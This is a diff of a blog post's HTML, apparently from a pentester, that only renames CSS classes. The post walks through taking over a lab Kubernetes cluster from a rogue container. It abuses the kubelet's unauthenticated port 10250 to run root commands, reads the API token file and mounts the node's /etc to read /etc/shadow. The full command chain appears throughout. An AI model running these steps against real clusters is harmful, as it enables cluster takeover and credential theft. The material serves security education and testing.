@@ -187,7 +187,7 @@
 
 <p>Then I deployed a container with some tools into the cluster, the scenario we’re testing is that an attacker has gained access to a container in the cluster, and we’ll see what they can do to take control of the cluster with only that access</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl run -i -t badcontainer --image=kalilinux/kali-linux-docker
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl run -i -t badcontainer --image=kalilinux/kali-linux-docker
 </code></pre></div></div>
 
 <p>which after a while for the image to download gives us a bash shell running in a container on the cluster.</p>
@@ -196,18 +196,18 @@
 
 <p>First add some tools to our build</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt update
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt update
 apt install nmap curl
 </code></pre></div></div>
 
 <p>Then scan the network. In this case my main network where the nodes are installed is 192.168.41.0/24</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sT -v -n -p10250 192.168.41.0/24
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sT -v -n -p10250 192.168.41.0/24
 </code></pre></div></div>
 
 <p>from that we get back a bunch of filtered ports but also three open ones which are the IP addresses of my kubernetes nodes.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 192.168.41.201
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 192.168.41.201
 Host is up (0.00013s latency).
 PORT      STATE SERVICE
 10250/tcp open  unknown
@@ -225,12 +225,12 @@ PORT      STATE SERVICE
 
 <p>Now we can use some of the kubectl commands mentioned in the exploit to start getting more access to the cluster.  First up lets enumerate our containers</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -sk https://192.168.41.233:10250/runningpods/ | python -mjson.tool
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -sk https://192.168.41.233:10250/runningpods/ | python -mjson.tool
 </code></pre></div></div>
 
 <p>This returns a list of the pods running on the node in JSON form, and also the images they’re based on.  The most interesting one here is</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      {
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      {
             "metadata": {
                 "creationTimestamp": null,
                 "name": "kube-apiserver-kube",
@@ -255,14 +255,14 @@ PORT      STATE SERVICE
 </code></pre></div></div>
 <p>it’s running the kube-apiserver image, so that’ll be our API server.  As I mentioned earlier the API server is basically the heart of the cluster, so access to it provides a lot of control over the cluster itself.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -XPOST "https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=ls -la /"
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -XPOST "https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=ls -la /"
 </code></pre></div></div>
 <p>lists the files in the root directory of that container and if we run</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -XPOST "https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=whoami"
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -XPOST "https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=whoami"
 </code></pre></div></div>
 
-<p>We get back the answer that every pentester likes to see which is <code class="highlighter-rouge">root</code> !</p>
+<p>We get back the answer that every pentester likes to see which is <code class="language-plaintext highlighter-rouge">root</code> !</p>
 
 <p>So at this point, that’s pretty bad news for the cluster owner.  A rogue container should not be able to execute privileged commands on the API server of the cluster.</p>
 
@@ -270,34 +270,34 @@ PORT      STATE SERVICE
 
 <p>if we do</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -XPOST "https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=ps -ef"
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -XPOST "https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=ps -ef"
 </code></pre></div></div>
 <p>we can see the process list for the API server which handily provides the path of the token file that Kubernetes uses to authenticate access to the API</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PID   USER     TIME   COMMAND
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PID   USER     TIME   COMMAND
     1 root       2:29 /usr/local/bin/kube-apiserver --v=4 --insecure-bind-address=127.0.0.1 --etcd-servers=http://127.0.0.1:2379 --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,DefaultStorageClass,ResourceQuota --service-cluster-ip-range=100.64.0.0/12 --service-account-key-file=/etc/kubernetes/pki/apiserver-key.pem --client-ca-file=/etc/kubernetes/pki/ca.pem --tls-cert-file=/etc/kubernetes/pki/apiserver.pem --tls-private-key-file=/etc/kubernetes/pki/apiserver-key.pem --token-auth-file=/etc/kubernetes/pki/tokens.csv --secure-port=443 --allow-privileged --etcd-servers=http://127.0.0.1:2379
 </code></pre></div></div>
-<p>here we can see that it’s <code class="highlighter-rouge">/etc/kubernetes/pki/tokens.csv</code></p>
+<p>here we can see that it’s <code class="language-plaintext highlighter-rouge">/etc/kubernetes/pki/tokens.csv</code></p>
 
 <p>so then we can just cat out that file</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -XPOST "https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=cat /etc/kubernetes/pki/tokens.csv"
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -XPOST "https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=cat /etc/kubernetes/pki/tokens.csv"
 </code></pre></div></div>
 <p>and we get the token which is the first field listed</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d65ba5f070e714ab,kubeadm-node-csr,9738242e-8681-11e6-b5b4-000c29d33879,system:kubelet-bootstrap
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d65ba5f070e714ab,kubeadm-node-csr,9738242e-8681-11e6-b5b4-000c29d33879,system:kubelet-bootstrap
 </code></pre></div></div>
 
 <p>Now we can communicate directly with the Kubernetes API like so</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -X GET -H "Authorization: Bearer d65ba5f070e714ab" https://192.168.41.233
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -X GET -H "Authorization: Bearer d65ba5f070e714ab" https://192.168.41.233
 </code></pre></div></div>
 
 <p>this gives us easier control of the cluster than we had from just running individual commands on it.</p>
 
 <p>We could persist with the HTTP API but TBH I find it easier to use kubectl, so we can just download that and point it at our cluster with our newly acquired token.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://storage.googleapis.com/kubernetes-release/release/v1.4.0/bin/linux/amd64/kubectl
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://storage.googleapis.com/kubernetes-release/release/v1.4.0/bin/linux/amd64/kubectl
 chmod +x kubectl
 ./kubectl config set-cluster test --server=https://192.168.41.233
 ./kubectl config set-credentials cluster-admin --token=d65ba5f070e714ab
@@ -307,7 +307,7 @@ chmod +x kubectl
 
 <p>so if we create a file called test-pod.yml</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apiVersion: v1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apiVersion: v1
 kind: Pod
 metadata:
   name: test-pd
@@ -325,11 +325,11 @@ spec:
       path: /etc
 </code></pre></div></div>
 
-<p>and start it up with <code class="highlighter-rouge">./kubectl create -f test-pod.yml</code></p>
+<p>and start it up with <code class="language-plaintext highlighter-rouge">./kubectl create -f test-pod.yml</code></p>
 
 <p>we can then run a command to cat out the /etc/shadow file of the underlying node</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./kubectl exec test-pd -c test-container cat /test-pd/shadow
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./kubectl exec test-pd -c test-container cat /test-pd/shadow
 </code></pre></div></div>
 
 <p>From there it’s just a bit of password cracking needed and we get shell access to the underlying node.</p>
